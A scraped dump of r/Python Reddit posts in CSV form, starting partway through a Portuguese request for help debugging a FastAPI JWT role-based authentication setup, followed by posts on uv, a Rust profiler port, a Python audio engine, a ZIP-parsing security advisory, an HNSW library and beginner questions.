    ¬† ¬† result = await session.execute(select(Usuario).filter(Usuario.email == email))
    ¬† ¬† usuario = result.scalars().first()
    
    ¬† ¬† if not usuario or not bcrypt_context.verify(senha, usuario.senha):
    ¬† ¬† ¬† ¬† return None
    ¬† ¬† return usuario
    
    
    
    async def get_usuario_logado(
    ¬† ¬† token: str = Depends(oauth2_scheme),
    ¬† ¬† db: AsyncSession = Depends(pegar_sessao)
    ) -> Usuario:
    ¬† ¬† try:
    ¬† ¬† ¬† ¬† payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    ¬† ¬† ¬† ¬† email: str = payload.get(""sub"")
    ¬† ¬† ¬† ¬† if email is None:
    ¬† ¬† ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Token inv√°lido"")
    
    ¬† ¬† ¬† ¬† result = await db.execute(select(Usuario).filter(Usuario.email == email))
    ¬† ¬† ¬† ¬† usuario = result.scalars().first()
    
    ¬† ¬† ¬† ¬† if usuario is None:
    ¬† ¬† ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Usu√°rio n√£o encontrado"")
    
    ¬† ¬† ¬† ¬† return usuario
    
    ¬† ¬† except JWTError:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Token inv√°lido ou expirado"")
    
    
    
    @auth_router.get(""/"")
    async def home():
    ¬† ¬† return {""mensagem"": ""Voc√™ acessou a rota de autentica√ß√£o"", ""autenticado"": False}
    
    
    
    @auth_router.post(""/criar_conta"")
    async def criar_conta(usuario_dados: UsuarioCriarPublico, db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† result = await db.execute(select(Usuario).filter(Usuario.email == usuario_dados.email))
    ¬† ¬† usuario = result.scalars().first()
    
    ¬† ¬† if usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=400, detail=""E-mail do usu√°rio j√° cadastrado."")
    
    ¬† ¬† novo_usuario = Usuario(
    ¬† ¬† ¬† ¬† nome=usuario_dados.nome,
    ¬† ¬† ¬† ¬† email=usuario_dados.email,
    ¬† ¬† ¬† ¬† senha=bcrypt_context.hash(usuario_dados.senha),
    ¬† ¬† ¬† ¬† tipo_usuario=usuario_dados.tipo_usuario,
    ¬† ¬† ¬† ¬† telefone=usuario_dados.telefone
    ¬† ¬† )
    
    ¬† ¬† db.add(novo_usuario)
    ¬† ¬† await db.commit()
    ¬† ¬† await db.refresh(novo_usuario)
    
    ¬† ¬† return {""mensagem"": f""Usu√°rio cadastrado com sucesso: {usuario_dados.email}""}
    
    # ¬†Login via JSON 
    @auth_router.post(""/login-json"")
    async def login_json(login_data: LoginSchema, db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† usuario = await autenticar_usuario(login_data.email, login_data.senha, db)
    
    ¬† ¬† if not usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=400, detail=""Credenciais inv√°lidas."")
    
    ¬† ¬† access_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": usuario.email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    ¬† ¬† )
    ¬† ¬† refresh_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": usuario.email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    ¬† ¬† )
    
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""access_token"": access_token,
    ¬† ¬† ¬† ¬† ""refresh_token"": refresh_token,
    ¬† ¬† ¬† ¬† ""token_type"": ""Bearer""
    ¬† ¬† }
    
    
    # ¬†Login-FORMULARIO
    @auth_router.post(""/login"")
    async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† usuario = await autenticar_usuario(form_data.username, form_data.password, db)
    
    ¬† ¬† if not usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=400, detail=""Credenciais inv√°lidas."")
    
    ¬† ¬† access_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": usuario.email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    ¬† ¬† )
    ¬† ¬† refresh_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": usuario.email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    ¬† ¬† )
    
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""access_token"": access_token,
    ¬† ¬† ¬† ¬† ""refresh_token"": refresh_token,
    ¬† ¬† ¬† ¬† ""token_type"": ""Bearer""
    ¬† ¬† }
    
    # ¬†Refresh Token
    @auth_router.post(""/refresh-token"")
    async def refresh_token_endpoint(token: str = Depends(oauth2_scheme)):
    ¬† ¬† try:
    ¬† ¬† ¬† ¬† payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    ¬† ¬† ¬† ¬† email = payload.get(""sub"")
    ¬† ¬† ¬† ¬† if email is None:
    ¬† ¬† ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Token inv√°lido"")
    ¬† ¬† except JWTError:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Token inv√°lido ou expirado"")
    
    ¬† ¬† novo_access_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    ¬† ¬† )
    ¬† ¬† novo_refresh_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    ¬† ¬† )
    
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""access_token"": novo_access_token,
    ¬† ¬† ¬† ¬† ""refresh_token"": novo_refresh_token,
    ¬† ¬† ¬† ¬† ""token_type"": ""Bearer""
    ¬† ¬† }
    
    
    # ¬†Desativar usu√°rio
    @auth_router.delete(""/usuarios/{usuario_id}"")
    async def desativar_usuario(usuario_id: int, db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† result = await db.execute(select(Usuario).filter(Usuario.id == usuario_id))
    ¬† ¬† usuario = result.scalars().first()
    
    ¬† ¬† if not usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=404, detail=""Usu√°rio n√£o encontrado"")
    
    ¬† ¬† usuario.ativo = False
    ¬† ¬† await db.commit()
    ¬† ¬† return {""mensagem"": ""Usu√°rio desativado com sucesso""}
    
    
    # ¬†Reativar usu√°rio
    @auth_router.put(""/usuarios/{usuario_id}/ativar"")
    async def reativar_usuario(usuario_id: int, db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† result = await db.execute(select(Usuario).filter(Usuario.id == usuario_id))
    ¬† ¬† usuario = result.scalars().first()
    
    ¬† ¬† if not usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=404, detail=""Usu√°rio n√£o encontrado"")
    
    ¬† ¬† usuario.ativo = True
    ¬† ¬† await db.commit()
    ¬† ¬† return {""mensagem"": ""Usu√°rio reativado com sucesso""}
    
    from app.dependencies import get_motorista_user, get_cliente_user
    
    # ¬†Rota protegida apenas para motoristas
    @auth_router.get(""/protegida/motorista"")
    async def rota_protegida_motorista(usuario_logado: Usuario = Depends(get_motorista_user)):
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""mensagem"": f""Ol√°, {usuario_logado.nome}! Voc√™ acessou uma rota protegida para MOTORISTAS."",
    ¬† ¬† ¬† ¬† ""tipo_usuario"": usuario_logado.tipo_usuario.name
    ¬† ¬† }
    
    # ¬†Rota protegida apenas para clientes
    @auth_router.get(""/protegida/cliente"")
    async def rota_protegida_cliente(usuario_logado: Usuario = Depends(get_cliente_user)):
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""mensagem"": f""Ol√°, {usuario_logado.nome}! Voc√™ acessou uma rota protegida para CLIENTES."",
    ¬† ¬† ¬† ¬† ""tipo_usuario"": usuario_logado.tipo_usuario.name
    ¬† ¬† }
    from fastapi import APIRouter, Depends, HTTPException, status
    from fastapi.security import OAuth2PasswordBearer
    from sqlalchemy.ext.asyncio import AsyncSession
    from sqlalchemy.future import select
    from app.models import Usuario
    from app.dependencies import pegar_sessao
    from app.security import bcrypt_context
    from app.schemas import UsuarioCriarPublico, LoginSchema
    from jose import JWTError, jwt
    from datetime import datetime, timezone, timedelta
    import os
    from dotenv import load_dotenv
    from fastapi.security import OAuth2PasswordRequestForm
    
    
    load_dotenv()
    
    
    auth_router = APIRouter(prefix=""/auth"", tags=[""auth""])
    
    
    
    SECRET_KEY = os.getenv(""SECRET_KEY"")
    if not SECRET_KEY:
    ¬† ¬† raise ValueError(""SECRET_KEY n√£o foi encontrada no .env ou est√° vazia!"")
    
    
    ALGORITHM = ""HS256""
    ACCESS_TOKEN_EXPIRE_MINUTES = 30
    REFRESH_TOKEN_EXPIRE_DAYS = 7
    
    
    
    oauth2_scheme = OAuth2PasswordBearer(tokenUrl=""/auth/login"")
    
    
    
    
    def criar_token_jwt(data: dict, duracao_token: timedelta):
    ¬† ¬† to_encode = data.copy()
    ¬† ¬† expire = datetime.now(timezone.utc) + duracao_token
    ¬† ¬† to_encode.update({""exp"": expire})
    ¬† ¬† return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    
    
    
    
    async def autenticar_usuario(email: str, senha: str, session: AsyncSession):
    ¬† ¬† result = await session.execute(select(Usuario).filter(Usuario.email == email))
    ¬† ¬† usuario = result.scalars().first()
    
    
    ¬† ¬† if not usuario or not bcrypt_context.verify(senha, usuario.senha):
    ¬† ¬† ¬† ¬† return None
    ¬† ¬† return usuario
    
    
    
    
    async def get_usuario_logado(
    ¬† ¬† token: str = Depends(oauth2_scheme),
    ¬† ¬† db: AsyncSession = Depends(pegar_sessao)
    ) -> Usuario:
    ¬† ¬† try:
    ¬† ¬† ¬† ¬† payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    ¬† ¬† ¬† ¬† email: str = payload.get(""sub"")
    ¬† ¬† ¬† ¬† if email is None:
    ¬† ¬† ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Token inv√°lido"")
    
    
    ¬† ¬† ¬† ¬† result = await db.execute(select(Usuario).filter(Usuario.email == email))
    ¬† ¬† ¬† ¬† usuario = result.scalars().first()
    
    
    ¬† ¬† ¬† ¬† if usuario is None:
    ¬† ¬† ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Usu√°rio n√£o encontrado"")
    
    
    ¬† ¬† ¬† ¬† return usuario
    
    
    ¬† ¬† except JWTError:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Token inv√°lido ou expirado"")
    
    
    
    
    @auth_router.get(""/"")
    async def home():
    ¬† ¬† return {""mensagem"": ""Voc√™ acessou a rota de autentica√ß√£o"", ""autenticado"": False}
    
    
    
    
    @auth_router.post(""/criar_conta"")
    async def criar_conta(usuario_dados: UsuarioCriarPublico, db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† result = await db.execute(select(Usuario).filter(Usuario.email == usuario_dados.email))
    ¬† ¬† usuario = result.scalars().first()
    
    
    ¬† ¬† if usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=400, detail=""E-mail do usu√°rio j√° cadastrado."")
    
    
    ¬† ¬† novo_usuario = Usuario(
    ¬† ¬† ¬† ¬† nome=usuario_dados.nome,
    ¬† ¬† ¬† ¬† email=usuario_dados.email,
    ¬† ¬† ¬† ¬† senha=bcrypt_context.hash(usuario_dados.senha),
    ¬† ¬† ¬† ¬† tipo_usuario=usuario_dados.tipo_usuario,
    ¬† ¬† ¬† ¬† telefone=usuario_dados.telefone
    ¬† ¬† )
    
    
    ¬† ¬† db.add(novo_usuario)
    ¬† ¬† await db.commit()
    ¬† ¬† await db.refresh(novo_usuario)
    
    
    ¬† ¬† return {""mensagem"": f""Usu√°rio cadastrado com sucesso: {usuario_dados.email}""}
    
    
    # ¬†Login via JSON 
    @auth_router.post(""/login-json"")
    async def login_json(login_data: LoginSchema, db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† usuario = await autenticar_usuario(login_data.email, login_data.senha, db)
    
    
    ¬† ¬† if not usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=400, detail=""Credenciais inv√°lidas."")
    
    
    ¬† ¬† access_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": usuario.email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    ¬† ¬† )
    ¬† ¬† refresh_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": usuario.email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    ¬† ¬† )
    
    
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""access_token"": access_token,
    ¬† ¬† ¬† ¬† ""refresh_token"": refresh_token,
    ¬† ¬† ¬† ¬† ""token_type"": ""Bearer""
    ¬† ¬† }
    
    
    
    # ¬†Login-FORMULARIO
    @auth_router.post(""/login"")
    async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† usuario = await autenticar_usuario(form_data.username, form_data.password, db)
    
    
    ¬† ¬† if not usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=400, detail=""Credenciais inv√°lidas."")
    
    
    ¬† ¬† access_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": usuario.email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    ¬† ¬† )
    ¬† ¬† refresh_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": usuario.email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    ¬† ¬† )
    
    
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""access_token"": access_token,
    ¬† ¬† ¬† ¬† ""refresh_token"": refresh_token,
    ¬† ¬† ¬† ¬† ""token_type"": ""Bearer""
    ¬† ¬† }
    
    
    # ¬†Refresh Token
    @auth_router.post(""/refresh-token"")
    async def refresh_token_endpoint(token: str = Depends(oauth2_scheme)):
    ¬† ¬† try:
    ¬† ¬† ¬† ¬† payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    ¬† ¬† ¬† ¬† email = payload.get(""sub"")
    ¬† ¬† ¬† ¬† if email is None:
    ¬† ¬† ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Token inv√°lido"")
    ¬† ¬† except JWTError:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=401, detail=""Token inv√°lido ou expirado"")
    
    
    ¬† ¬† novo_access_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    ¬† ¬† )
    ¬† ¬† novo_refresh_token = criar_token_jwt(
    ¬† ¬† ¬† ¬† {""sub"": email},
    ¬† ¬† ¬† ¬† duracao_token=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    ¬† ¬† )
    
    
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""access_token"": novo_access_token,
    ¬† ¬† ¬† ¬† ""refresh_token"": novo_refresh_token,
    ¬† ¬† ¬† ¬† ""token_type"": ""Bearer""
    ¬† ¬† }
    
    
    
    # ¬†Desativar usu√°rio
    @auth_router.delete(""/usuarios/{usuario_id}"")
    async def desativar_usuario(usuario_id: int, db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† result = await db.execute(select(Usuario).filter(Usuario.id == usuario_id))
    ¬† ¬† usuario = result.scalars().first()
    
    
    ¬† ¬† if not usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=404, detail=""Usu√°rio n√£o encontrado"")
    
    
    ¬† ¬† usuario.ativo = False
    ¬† ¬† await db.commit()
    ¬† ¬† return {""mensagem"": ""Usu√°rio desativado com sucesso""}
    
    
    
    # ¬†Reativar usu√°rio
    @auth_router.put(""/usuarios/{usuario_id}/ativar"")
    async def reativar_usuario(usuario_id: int, db: AsyncSession = Depends(pegar_sessao)):
    ¬† ¬† result = await db.execute(select(Usuario).filter(Usuario.id == usuario_id))
    ¬† ¬† usuario = result.scalars().first()
    
    
    ¬† ¬† if not usuario:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=404, detail=""Usu√°rio n√£o encontrado"")
    
    
    ¬† ¬† usuario.ativo = True
    ¬† ¬† await db.commit()
    ¬† ¬† return {""mensagem"": ""Usu√°rio reativado com sucesso""}
    
    
    from app.dependencies import get_motorista_user, get_cliente_user
    
    
    # ¬†Rota protegida apenas para motoristas
    @auth_router.get(""/protegida/motorista"")
    async def rota_protegida_motorista(usuario_logado: Usuario = Depends(get_motorista_user)):
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""mensagem"": f""Ol√°, {usuario_logado.nome}! Voc√™ acessou uma rota protegida para MOTORISTAS."",
    ¬† ¬† ¬† ¬† ""tipo_usuario"": usuario_logado.tipo_usuario.name
    ¬† ¬† }
    
    
    # ¬†Rota protegida apenas para clientes
    @auth_router.get(""/protegida/cliente"")
    async def rota_protegida_cliente(usuario_logado: Usuario = Depends(get_cliente_user)):
    ¬† ¬† return {
    ¬† ¬† ¬† ¬† ""mensagem"": f""Ol√°, {usuario_logado.nome}! Voc√™ acessou uma rota protegida para CLIENTES."",
    ¬† ¬† ¬† ¬† ""tipo_usuario"": usuario_logado.tipo_usuario.name
    ¬† ¬† }

\- \`dependencies.py\` ‚Üí Fun√ß√£o \`get\_current\_user()\` e verifica√ß√£o de fun√ß√£o : 

    from app.database import AsyncSessionLocal
    from sqlalchemy.ext.asyncio import AsyncSession
    from typing import AsyncGenerator
    from fastapi import Depends, HTTPException, status
    from app.security import get_current_user
    from app.models import Usuario, TipoUsuarioEnum
    
    async def pegar_sessao() -> AsyncGenerator[AsyncSession, None]:
    ¬† ¬† async with AsyncSessionLocal() as session:
    ¬† ¬† ¬† ¬† yield session
    
    async def get_current_active_user(user: Usuario = Depends(get_current_user)) -> Usuario:
    ¬† ¬† if not user.ativo:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=400, detail=""Usu√°rio inativo"")
    ¬† ¬† return user
    
    async def get_current_admin_user(user: Usuario = Depends(get_current_active_user)) -> Usuario:
    ¬† ¬† # Se voc√™ quiser admin futuramente, adicione aqui
    ¬† ¬† raise HTTPException(status_code=403, detail=""Acesso de admin n√£o implementado"")
    
    async def get_cliente_user(user: Usuario = Depends(get_current_active_user)) -> Usuario:
    ¬† ¬† if user.tipo_usuario != TipoUsuarioEnum.cliente:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=403, detail=""Acesso permitido apenas para clientes"")
    ¬† ¬† return user
    
    async def get_motorista_user(user: Usuario = Depends(get_current_active_user)) -> Usuario:
    ¬† ¬† if user.tipo_usuario != TipoUsuarioEnum.motorista:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=403, detail=""Acesso permitido apenas para motoristas"")
    ¬† ¬† return user
    
    
    from app.database import AsyncSessionLocal
    from sqlalchemy.ext.asyncio import AsyncSession
    from typing import AsyncGenerator
    from fastapi import Depends, HTTPException, status
    from app.security import get_current_user
    from app.models import Usuario, TipoUsuarioEnum
    
    
    async def pegar_sessao() -> AsyncGenerator[AsyncSession, None]:
    ¬† ¬† async with AsyncSessionLocal() as session:
    ¬† ¬† ¬† ¬† yield session
    
    
    async def get_current_active_user(user: Usuario = Depends(get_current_user)) -> Usuario:
    ¬† ¬† if not user.ativo:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=400, detail=""Usu√°rio inativo"")
    ¬† ¬† return user
    
    
    async def get_current_admin_user(user: Usuario = Depends(get_current_active_user)) -> Usuario:
    ¬† ¬† # Se voc√™ quiser admin futuramente, adicione aqui
    ¬† ¬† raise HTTPException(status_code=403, detail=""Acesso de admin n√£o implementado"")
    
    
    async def get_cliente_user(user: Usuario = Depends(get_current_active_user)) -> Usuario:
    ¬† ¬† if user.tipo_usuario != TipoUsuarioEnum.cliente:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=403, detail=""Acesso permitido apenas para clientes"")
    ¬† ¬† return user
    
    
    async def get_motorista_user(user: Usuario = Depends(get_current_active_user)) -> Usuario:
    ¬† ¬† if user.tipo_usuario != TipoUsuarioEnum.motorista:
    ¬† ¬† ¬† ¬† raise HTTPException(status_code=403, detail=""Acesso permitido apenas para motoristas"")
    ¬† ¬† return user
    
    
    

\- Exemplo de rota protegida que falha

\- Exemplo de rota protegida que funciona (para compara√ß√£o)

\- Como estou testando (ex.: \`Authorization: Bearer <token>\` no Postman)



\*\*O que j√° tentei:\*\*

\- Conferir o tempo de expira√ß√£o do token

\- Garantir que o token no cabe√ßalho est√° exatamente igual ao recebido no login

\- Comparar as rotas que funcionam e as que falham para identificar diferen√ßas



Algu√©m j√° passou por algo parecido com FastAPI + JWT + controle de acesso por fun√ß√£o?  

Pode ser algo relacionado √† forma como configurei minhas depend√™ncias ou √† aplica√ß√£o das restri√ß√µes de fun√ß√£o?

"
1mkkoj8,What are the benefits of UV's build backend?,auric_gremlin,118,29,2025-08-08 03:33:24,https://www.reddit.com/r/Python/comments/1mkkoj8/what_are_the_benefits_of_uvs_build_backend/,Has anyone started using the newly stabilized build backend from UV? I'm seeing little discussion as to the benefits of it and am curious as to whether anyone has had tangible experiences with it.
1mkg85s,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,3,0,2025-08-08 00:00:15,https://www.reddit.com/r/Python/comments/1mkg85s/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1mkcspm,Converting FunctionTrace (python profiler) from C to Rust,teh_matt,0,0,2025-08-07 21:34:21,https://www.reddit.com/r/Python/comments/1mkcspm/converting_functiontrace_python_profiler_from_c/,"https://programsareproofs.com/articles/functiontrace-rust-conversion/

I recently converted FunctionTrace‚Äôs Python implementation from a C extension into a Rust extension backed by PyO3. While there are various resources for creating new Python extensions written in Rust, I found very little information on how to incrementally migrate an existing extension. This writeup details the somewhat sketchy but effective approach I took to do a gradual migration from C to Rust."
1mkaf83,Synchrotron - a pure python live audio engine!,ThatOtherAndrew,65,25,2025-08-07 20:02:44,https://www.reddit.com/r/Python/comments/1mkaf83/synchrotron_a_pure_python_live_audio_engine/,"Hello everyone! I've spent the past year working on **Synchrotron** \- a live audio engine I've been programming from the ground up in **only Python.** This mainly stems from being tired of everything live audio being written in JUCE/C/C++, and the usual response to ""how do you make a synth in Python"" being ""*just don't""*.

Sure, Python isn't as performant as other languages for this. But in exchange, it's incredibly modular and hackable! I aim to keep working on Synchrotron until it's an actual legitimate option for music production and production audio engines.

Frontend URL: [https://synchrotron.thatother.dev/](https://synchrotron.thatother.dev/)  
Source code: [https://github.com/ThatOtherAndrew/Synchrotron](https://github.com/ThatOtherAndrew/Synchrotron)

# What My Project Does

Synchrotron processes *nodes*, which are simple Python classes that define some operation they do with inputs and outputs. A node can be as short as 5 lines, and an example is shown below:

    class IncrementNode(Node):
        input: StreamInput
        output: StreamOutput
    
        def render(self, ctx):
            self.out.write(self.a.read(ctx) + 1)

These nodes can be spawned and linked together into a *graph*, either programmatically or through the [editor website](https://synchrotron.thatother.dev). Synchrotron then executes this graph with all data being *streamed* \- at 44.1 KHz with a 256 sample buffer by default, for best live audio support.

This is really powerful to build upon, and Synchrotron can act as a **synthesiser**, **audio effects engine**, **MIDI instrument**, **live coding environment**, **audio router/muxer**, and likely more in the future.

In the interests of making Synchrotron as flexible as possible for all sorts of projects and use-cases, besides the web UI there is also a Python API, REST API, DSL, and standalone TUI console for interacting with the engine.

# Target Audience

Please don't actually use this in a production project! Currently this is for people interested in tinkering with music and sound to check out, but hopefully one day it might be viable for use in all sorts of sonic experiments (or even in a game engine!?)

The documentation somewhat sucks currently, but if you leave a comment with constructive criticism about what sucks then I'll know where to focus my efforts! (and will help you out in replies if you want to use Synchrotron lol)

# Comparison

|Features|Synchrotron|Pure Data (Pd)|Tidal Cycles|SuperCollider|Max MSP|Minihost Modular (FL Studio)|
|:-|:-|:-|:-|:-|:-|:-|
|Open source?|‚úÖ|‚úÖ|‚úÖ|‚úÖ|‚ùå|‚ùå|
|Visual editor?|‚úÖ|‚úÖ|‚ùå|‚ùå|‚úÖ|‚úÖ|
|Control API?|‚úÖ|‚ùå|‚úÖ|‚úÖ|‚ùå|‚ùå|
|Stable?|‚ùå|‚úÖ|‚úÖ|‚úÖ|‚úÖ|‚ùå|
|Modular?|‚úÖ|‚úÖ|‚ùå|‚ùå|‚úÖ|‚úÖ|"
1mk8u9u,Decision paralysis,JazzyBirdz,0,18,2025-08-07 19:02:10,https://www.reddit.com/r/Python/comments/1mk8u9u/decision_paralysis/,"so I just finished my first Python course, (free code camp) and i wanna use the skills ive learned and actually practice, but theres SO much it can do im facing some pretty big decision paralysis, what are some sites or resources i can use to come up with practice problems and start coding some things for that? (im going into cyber security, if that matters, but i also wanna code for fun!) no preference on the type, just something i can start small on"
1mk5uio,Preventing ZIP parser confusion attacks on Python package installers,zurtex,31,0,2025-08-07 17:09:58,https://www.reddit.com/r/Python/comments/1mk5uio/preventing_zip_parser_confusion_attacks_on_python/,"uv and PyPI have both released statements on a hypothetical security vulnerability that has been prevented in PyPI and uv 0.8.6+.

PyPI Summary: https://discuss.python.org/t/pypi-is-preventing-zip-parser-confusion-attacks-on-python-package-installers/101572/2

uv summary: https://github.com/astral-sh/uv/releases/tag/0.8.6

PyPI detailed blog post: https://blog.pypi.org/posts/2025-08-07-wheel-archive-confusion-attacks/

uv detailed blog post: https://astral.sh/blog/uv-security-advisory-cve-2025-54368

While probably not critical by itself if you are security paranoid or you use uv and a non-PyPI third party index that non trusted users can upload to I would recommend upgrading uv."
1mk5sk8,What packages should intermediate Devs know like the back of their hand?,MilanTheNoob,241,179,2025-08-07 17:07:59,https://www.reddit.com/r/Python/comments/1mk5sk8/what_packages_should_intermediate_devs_know_like/,"Of course it's highly dependent on why you use python. But I would argue there are essentials that apply for almost all types of Devs including requests, typing, os, etc.

Very curious to know what other packages are worth experimenting with and committing to memory"
1mk2vx5,"Which is better for a new API, FastAPI or Django REST Framework?",fatherofgoku,42,43,2025-08-07 15:18:38,https://www.reddit.com/r/Python/comments/1mk2vx5/which_is_better_for_a_new_api_fastapi_or_django/,"Hey devs , I‚Äôm going for a new backend for a mid-sized project (real-time dashboard + standard CRUD APIs). I‚Äôve used DRF in production before, but I‚Äôm curious about FastAPI‚Äôs performance and async support for this one."
1mk2rds,"pyhnsw = small, fast nearest neighbor embeddings search",Razzmatazz_Informal,18,2,2025-08-07 15:13:44,https://www.reddit.com/r/Python/comments/1mk2rds/pyhnsw_small_fast_nearest_neighbor_embeddings/,"**What My Project Does**  
HI, so a while back I created¬†[https://github.com/dicroce/hnsw](https://github.com/dicroce/hnsw)¬†which is a C++ implementation of the ""hierarchical navigable small worlds"" embeddings index which allows for fast nearest neighbor search.

Because I wanted to use it in a python project I recently created some python bindings for it and I'm proud to say its now on pypi:¬†[https://pypi.org/project/pyhnsw/](https://pypi.org/project/pyhnsw/)

Using it is as simple as:

    import numpy as np
    import pyhnsw
    
    # Create an index for 128-dimensional vectors
    index = pyhnsw.HNSW(dim=128, M=16, ef_construction=200, ef_search=100, metric=""l2"")
    
    # Generate some random data
    data = np.random.randn(10000, 128).astype(np.float32)
    
    # Add vectors to the index
    index.add_items(data)
    
    # Search for nearest neighbors
    query = np.random.randn(128).astype(np.float32)
    indices, distances = index.search(query, k=10)
    
    print(f""Found {len(indices)} nearest neighbors"")
    print(f""Indices: {indices}"")
    print(f""Distances: {distances}"")

**Target Audience**  
Python developers working with embeddings who want a production ready, focused nearest neighbor embeddings search.

**Comparison**

There are a TON of hnsw implementations on pypi. Of the ones I've looked at I would say mine has the advantage that its both very small and focused but also fast because I'm using Eigen's SIMD support."
1mk2huf,BLE Beacons in gesture system - recommendations,EconomicsPrior5665,4,1,2025-08-07 15:03:39,https://www.reddit.com/r/Python/comments/1mk2huf/ble_beacons_in_gesture_system_recommendations/,"TLDR: I‚Äòm looking for a BLE System to combine with my gesture system in python

I‚Äòm building a prototype as part of my master thesis. 
It‚Äòs a gesture system for selecting and navigating a document, setting time stamps, short codes and signing (with the leap motion controller 2). For the signature I need to identify the person who‚Äòs signing. I plan to do this with BLE tags, each person gets one and the closest to the system is the one who‚Äòs signing (with a maximum distance so nobody signs by accident). 

My plan for python: 
